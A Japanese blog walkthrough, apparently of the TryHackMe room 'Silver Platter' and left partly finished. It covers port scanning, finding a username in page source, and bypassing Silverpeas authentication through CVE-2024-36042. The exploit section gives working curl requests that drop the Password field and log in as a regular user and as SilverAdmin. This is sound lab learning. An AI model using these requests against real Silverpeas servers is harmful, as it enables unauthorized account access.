---
author: "ijikeman"
showToc: true
TocOpen: true
title: "TryHackMe: Silver Platter Walkthrough"
date: 2026-03-21T00:00:00+09:00
aliases: ["/TryHackMe/silverplatter"]
tags: ["TryHackMe", "CTF", "walkthrough", "Silverpeas", "CVE-2024-36042", "認証バイパス"]
categories: ["TryHackMe"]
draft: false
cover:
    image: "/images/eyecatch/TryHackMe/silverplatter/index.png"
---

# このページでわかること

* TryHackMe ルーム「Silver Platter」の Walkthrough（途中まで）
* RustScan + Nmap を使ったポートスキャンと情報収集
* Web ページのソースから重要なユーザー名を発見する手法
* CVE-2024-36042: Silverpeas のパスワードフィールド省略による認証バイパス

# ルーム情報

| 項目 | 内容 |
|------|------|
| ルーム名 | Silver Platter |
| 難易度 | Easy |
| カテゴリ | Web, Authentication Bypass |
| URL | https://tryhackme.com/room/silverplatter |

# 執筆時の環境

* OS: Kali Linux
* ツール: rustscan, nmap, curl

# 参考サイト

* [TryHackMe 公式](https://tryhackme.com/room/silverplatter)
* [CVE-2024-36042 詳細](https://www.cve.org/CVERecord?id=CVE-2024-36042)

---

# 1. ポートスキャン

## 1-1. RustScan + Nmap によるフルスキャン

```bash
rustscan -a 10.48.184.93 --ulimit 5000 -- -sC -sV
```

| ポート | サービス | バージョン | 備考 |
|--------|---------|-----------|------|
| 22/tcp | SSH | OpenSSH 8.9p1 Ubuntu | |
| 80/tcp | HTTP | nginx 1.18.0 | タイトル: "Hack Smarter Security" |
| 8080/tcp | HTTP | Silverpeas 6.3.1 | コラボレーションプラットフォーム |

開いているポートは 3 つ。SSH・Web サーバー（nginx）・ポート 8080 の Silverpeas という構成。

---

# 2. 調査

## 2-1. ポート 80 の調査

ポート 80 のページをダウンロードし、ユーザー名・パスワード・管理者情報に関連するキーワードで絞り込む。

```bash
curl -s http://10.48.184.93:80 | grep -Ei "user|admin|email|name|contact|password|manager|silverpeas"
```

Contact セクションに以下の記述を発見:

> "please reach out to our project manager on **Silverpeas**. His username is **`scr1ptkiddy`**"

この一文から 2 つの重要な情報が得られた。

| 情報 | 意味 |
|------|------|
| Silverpeas | ポート 8080 で動いているソフトウェアの名前が確定 |
| scr1ptkiddy | ログイン試行すべきユーザー名が判明 |

`scr1ptkiddy` は `script kiddy` の leet speak 表記（1→i, 0→o）。

## 2-2. ポート 8080 の調査

`/silverpeas/` にアクセスすると 302 リダイレクトでログインページへ誘導される。Silverpeas 6.3.1 が動作していることを確認。

```bash
curl -I http://10.48.184.93:8080/silverpeas/
# -> 302 Location: /silverpeas/Login
```

---

# 3. 脆弱性の発見

## 3-1. CVE-2024-36042: Silverpeas 認証バイパス (CVSS 9.8 Critical)

影響バージョン: Silverpeas 6.3.5 未満（6.3.1 も対象）

**概要**: ログインリクエストで `Password` フィールドを**省略**するだけで認証をバイパスできる。アプリが「パスワードなし = SSO ログイン」と誤解釈し、アクセスを許可してしまう設計上の欠陥。

まず通常のログインリクエストを試みる。

```bash
# 通常ログイン (失敗)
curl -X POST http://10.48.184.93:8080/silverpeas/AuthenticationServlet \
  -d "Login=scr1ptkiddy&Password=xxx&DomainId=0"
# -> ErrorCode=1
```

次に `Password` フィールドを省略して送信する。

```bash
# CVE-2024-36042: Password フィールドを省略 (成功)
curl -c cookies.txt \
  -X POST http://10.48.184.93:8080/silverpeas/AuthenticationServlet \
  -d "Login=scr1ptkiddy&DomainId=0"
# -> Location: /silverpeas/Main//look/jsp/MainFrame.jsp
```

リダイレクト先がメインフレームになっており、`scr1ptkiddy` としてログイン成功。

同様の手法で管理者ユーザー `SilverAdmin` も認証バイパスに成功した。

```bash
curl -c cookies_admin.txt \
  -X POST http://10.48.184.93:8080/silverpeas/AuthenticationServlet \
  -d "Login=SilverAdmin&DomainId=0"
# -> Location: /silverpeas/Main//look/jsp/MainFrame.jsp
```

---

# 4. 以降の調査（調査中）

* Silverpeas 内のメッセージ・ファイルの確認
* 認証情報・SSH キーの探索
* SSH ログイン試行
* 権限昇格の調査

---

# 5. フラグ取得

| フラグ | 状態 |
|--------|------|
| user.txt | 調査中 |
| root.txt | 調査中 |

---

# まとめ

今回は CVE-2024-36042 を利用した Silverpeas の認証バイパスまで確認できた。

パスワードフィールドを HTTP リクエストから省略するだけで CVSS 9.8（Critical）の認証バイパスが成立するという非常にシンプルかつ危険な脆弱性で、ソフトウェアのバージョン管理の重要性を改めて認識させられる。

また、Web ページのソースを丁寧に調べることで攻略に必要なユーザー名（`scr1ptkiddy`）を発見できた点も重要なポイント。leet speak のような表記を読み解く能力もペネトレーションテストでは役立つ場面がある。

## 習得スキル

| スキル | 内容 |
|--------|------|
| CVE-2024-36042 | パスワードフィールドを省略するだけで認証バイパスが可能な Silverpeas の脆弱性 |
| OSINT（Web ソース解析） | `curl` + `grep` でページソースから重要な情報（ユーザー名・使用ソフト）を収集 |
| leet speak 解読 | `scr1ptkiddy` = `script kiddy` のような leet speak 表記の読み解き |
